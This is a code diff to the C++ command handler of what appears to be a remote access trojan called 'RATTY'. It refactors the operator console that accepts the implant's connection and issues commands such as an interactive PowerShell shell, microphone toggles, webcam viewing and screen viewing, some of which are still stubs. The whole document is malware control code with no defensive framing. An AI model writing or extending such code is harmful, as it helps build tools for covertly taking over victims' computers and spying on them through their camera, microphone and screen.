@@ -3,6 +3,7 @@
 Handler::Handler(std::string lhost, int lport): LHOST(lhost), LPORT(lport) {
     rat_conn = INVALID_SOCKET;
     InitializeServer();
+    activeModule = nullptr;
 }
 
 void Handler::InitializeServer() {
@@ -61,52 +62,12 @@ void Handler::InitializeServer() {
 
     // enter user input mode
     Interact();
-    CloseRat();
+    NotifyClose();
 
+    activeModule = nullptr;
     closesocket(rat_conn);
     closesocket(sock_server);
     WSACleanup();
-}
-
-void Handler::Interact() {
-    if (rat_conn == INVALID_SOCKET) {
-        std::cerr << "[-] Socket Connection not Valid!" << "\n";
-        return;
-    }
-
-    std::string input;
-    while (input != "exit") {
-        printf("RATTY >$ ");
-        std::cin >> input;
-        std::pair<std::string, MsgType> result = ProcessCommand(input);
-
-        // create RatPacket and send it to rat_conn
-        if (result.second != MsgType::NONE) {
-            SendPacket(result.first, result.second);
-        }
-    }
-}
-
-std::pair<std::string, MsgType> Handler::ProcessCommand(const std::string& input) {
-    if (input == "exit") return std::make_pair("exit", MsgType::NONE);
-
-    if (input == "shell") {
-        // enter interactive powershell session
-        return std::make_pair("shell", MsgType::EXEC);
-    } if (input == "mic_on") {
-        // enable mic stream
-    } if (input == "mic_off") {
-        // disable mic stream
-    } if (input == "camera_on") {
-        // open a new window and display web-cam view
-        return std::make_pair("camera_on", MsgType::CAMERA);
-    } if (input == "screen_view") {
-        // open a new window and display screenshot frames
-        return std::make_pair("screen_view", MsgType::SCREEN);
-    } else {
-        std::cout << input << ": RATTY command not found" << std::endl;
-        return std::make_pair("none", MsgType::NONE);
-    }
 }
 
 std::string Handler::GenerateChallenge() {
@@ -172,27 +133,51 @@ bool Handler::Challenge() {
             std::cerr << "[-] Recv no Data!" << "\n";
             return false;
         }
-        std::cerr << "[-] Invalid Message!" << "\n";
+        std::cerr << "[-] Invalid Message! (" << msg << ")" << "\n";
         return false;
     }
     std::cerr << "[-] Recv no Data!" << "\n";
     return false;
 }
 
-void Handler::SendPacket(const std::string& data, const MsgType& type) {
-    RatPacket packet(data, type);
+void Handler::Interact() {
+    if (rat_conn == INVALID_SOCKET) {
+        std::cerr << "[-] Socket Connection not Valid!" << "\n";
+        return;
+    }
 
-    // send packet frame
-    send(rat_conn, packet.Frame().c_str(), packet.SizeOf(), 0);
-
-    char buffer[1024] = {0};
-    int bytesReceived = recv(rat_conn, buffer, sizeof(buffer), 0);
-    if (bytesReceived > 0) {
-        std::cout << "Server response: " << std::string(buffer, bytesReceived) << "\n";
+    std::string input;
+    while (input != "exit") {
+        printf("RATTY >$ ");
+        std::cin >> input;
+        ProcessCommand(input);
+        if (activeModule != nullptr) {
+            activeModule->execute();
+            activeModule = nullptr;
+        }
     }
 }
 
-void Handler::CloseRat() {
+void Handler::ProcessCommand(const std::string& input) {
+    if (input == "exit") return;
+
+    if (input == "shell") {
+        // enter interactive powershell session
+        activeModule = &(ShellModule::getInstance());
+    } else if (input == "mic_on") {
+        // enable mic stream
+    } else if (input == "mic_off") {
+        // disable mic stream
+    } else if (input == "camera_on") {
+        // open a new window and display web-cam view
+    } else if (input == "screen_view") {
+        // open a new window and display screenshot frames
+    } else {
+        std::cout << input << ": RATTY command not found" << std::endl;
+    }
+}
+
+void Handler::NotifyClose() {
     std::cout << "[*] Notifying RAT of closing. . .\n";
-    // send(rat_conn, msg, (int)strlen(msg), 0);
+    RatPacketUtils::Send(rat_conn, RatPacket("closed", MsgType::NONE));
 }
